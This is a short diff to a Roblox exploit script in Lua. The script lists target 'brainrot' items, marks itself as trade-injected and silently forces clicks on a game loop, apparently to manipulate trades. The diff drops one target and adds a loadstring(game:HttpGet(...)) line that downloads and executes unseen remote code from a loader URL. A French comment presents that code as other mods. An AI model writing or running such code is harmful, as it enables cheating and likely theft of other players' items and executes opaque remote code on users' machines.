@@ -22,7 +22,6 @@ getgenv().TARGET_BRAINROTS = {
     ["25"] = true, ["To To To Sahur"] = true,
     ["Capitano Moby"] = true, ["Rosey and Teddy"] = true,
     ["Hydra Dragon Cannelloni"] = true,
-    ["spaghetti tualleti"] = true,
 }
 if getgenv().AzurTradeInjected_v17 then return end
 getgenv().AzurTradeInjected_v17 = true
@@ -111,3 +110,7 @@ RunService.Heartbeat:Connect(function()
             SilentForceClick(v)
         end
     end
+end)
+
+-- [[ CHARGEMENT DES AUTRES MODS (ANTITRAP, SPEED...) ]] --
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
